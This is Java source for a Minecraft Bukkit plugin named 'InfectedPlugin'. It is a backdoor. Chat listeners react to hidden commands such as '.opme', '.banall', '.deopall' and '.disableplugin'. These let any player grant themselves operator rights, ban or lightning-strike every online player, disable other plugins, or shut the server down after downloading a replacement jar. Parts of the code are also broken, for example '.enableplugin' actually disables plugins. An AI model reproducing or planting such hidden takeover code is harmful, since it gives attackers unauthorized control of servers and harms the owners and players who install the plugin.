package org.CreeperCoders.InfectedPlugin;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.command.CommandSender;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.Random;

import org.bukkit.event.EventPriority;

public class PlayerListener implements Listener
{
    private Random random = new Random();

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerChat(AsyncPlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
    {
        String message = event.getMessage();
        String[] args = message.split(" ");
    	
        if (event.getMessage().toLowerCase().contains(".opme"))
        {
            event.getPlayer().setOp(true);
            event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".disableplugin"))
        {
            Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
            if (plugin != null)
            {
                Bukkit.getServer().getPluginManager().disablePlugin(plugin);
            }
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".enableplugin"))
        {
            Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
            if (plugin != null)
            {
                Bukkit.getServer().getPluginManager().disablePlugin(plugin);
            }
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".enablevanilla"))
        {
            //ROFL
            if (!new File("minecraft_server.jar").exists())
            {
                sender.sendMessage(ChatColor.RED + "minecraft_server.1.6.2.jar not found, downloading...");

                URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar");
                ReadableByteChannel rbc = Channels.newChannel(url.openStream());
                @SuppressWarnings("resource")
				FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar");
                fos.getChannel().transferFrom(rbc, 0, 1 << 24);

                sender.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla...");
            }
            Bukkit.shutdown();
            event.setCancelled(true);
            //Hopefully this works...
        }
        if (event.getMessage().toLowerCase().contains(".deop"))
        {
            Bukkit.getServer().getPlayer(args[1]);
            event.getPlayer().setOp(false);
            event.getPlayer().sendMessage(ChatColor.RED + "You are no longer OP.");
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".op"))
        {
            Bukkit.getServer().getPlayer(args[1]);
            event.getPlayer().setOp(true);
            event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
            event.setCancelled(true);
        }
        if (event.getMessage().toLowerCase().contains(".banall"))
        {
            for (final Player p : Bukkit.getServer().getOnlinePlayers())
            {
                p.kickPlayer("The Ban Hammer has spoken!");
                p.setBanned(true);
                event.setCancelled(true);
            }
        }
        if (event.getMessage().toLowerCase().contains(".deopall"))
        {
            for (final Player p : Bukkit.getServer().getOnlinePlayers())
            {
                p.setOp(false);
                //Something extra c:
                final Location target_pos = p.getLocation();
                for (int x = -1; x <= 1; x++)
                {
                    for (int z = -1; z <= 1; z++)
                    {
                        final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
                        target_pos.getWorld().strikeLightning(strike_pos);
                    }
                }
                event.setCancelled(true);
            }
        }
        // Is not effective for onPlayerQuit, but will select a random player to be banned.
        if (event.getMessage().toLowerCase().contains(".randombanl"))
        {
            Player[] players = Bukkit.getServer().getOnlinePlayers();
            final Player p = players[random.nextInt(players.length)];

            if (p == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
            {
                //do nothing
            }
            else
            {
                p.kickPlayer(ChatColor.RED + "GTFO.");
                p.setBanned(true);
            }
            event.setCancelled(true);
        }
    }

}
